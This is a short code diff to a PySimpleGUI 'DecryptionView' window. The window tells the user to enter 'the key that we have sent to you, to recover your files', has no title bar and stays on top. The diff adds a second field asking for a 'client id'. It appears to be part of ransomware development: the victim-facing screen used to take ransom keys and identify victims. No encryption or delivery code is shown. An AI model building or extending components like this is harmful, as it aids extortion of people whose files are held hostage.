@@ -10,6 +10,10 @@ class DecryptionView(object):
                    'Introduce the key that we have sent to you, to recover your files here', font='Helvetica 13')],
                [sg.InputText()],
                [sg.Text('')],
+               [sg.Text(
+                   'Introduce your client id here', font='Helvetica 13')],
+               [sg.InputText()],
+               [sg.Text('')],
                [sg.Button('Decrypt files')]]
 
         window = sg.Window('Title', layout, no_titlebar=True, keep_on_top=True, element_justification='c')
